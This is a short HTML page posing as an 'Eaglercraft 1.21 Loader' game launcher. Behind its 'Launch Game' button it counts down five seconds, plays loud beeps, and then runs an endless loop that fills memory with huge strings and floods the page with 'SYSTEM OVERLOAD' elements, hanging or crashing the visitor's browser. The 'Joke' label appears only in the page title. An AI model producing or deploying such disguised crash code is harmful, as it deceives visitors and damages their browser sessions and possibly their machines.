<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Eaglercraft 1.21 (Joke)</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #222; color: white; overflow: hidden; }
        #timer { font-size: 5rem; color: #ff4d4d; }
        .btn { padding: 20px 40px; font-size: 1.5rem; cursor: pointer; background: #4CAF50; border: none; color: white; border-radius: 10px; }
    </style>
</head>
<body>
    <div id="content">
        <h1>Eaglercraft 1.21 Loader</h1>
        <button class="btn" onclick="start()">Launch Game</button>
        <div id="timer">5</div>
    </div>

    <script>
        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        function beep() {
            const osc = audioCtx.createOscillator();
            const gain = audioCtx.createGain();
            osc.connect(gain); gain.connect(audioCtx.destination);
            osc.type = "sawtooth"; osc.frequency.value = 880;
            gain.gain.value = 0.1; osc.start();
            setTimeout(() => osc.stop(), 200);
        }

        function start() {
            if (audioCtx.state === 'suspended') audioCtx.resume();
            let timeLeft = 5;
            const interval = setInterval(() => {
                timeLeft--;
                document.getElementById('timer').innerText = timeLeft;
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    triggerCrash();
                }
            }, 1000);
        }

        function triggerCrash() {
            for(let i=0; i<12; i++) { setTimeout(beep, i * 200); }
            const memoryLeak = [];
            while(true) {
                memoryLeak.push(new Array(1000000).join("OVERLOAD "));
                const div = document.createElement('div');
                div.innerHTML = "<h1>SYSTEM OVERLOAD</h1>";
                document.body.appendChild(div);
                console.log("Cooking system...");
            }
        }
    </script>
</body>
</html>
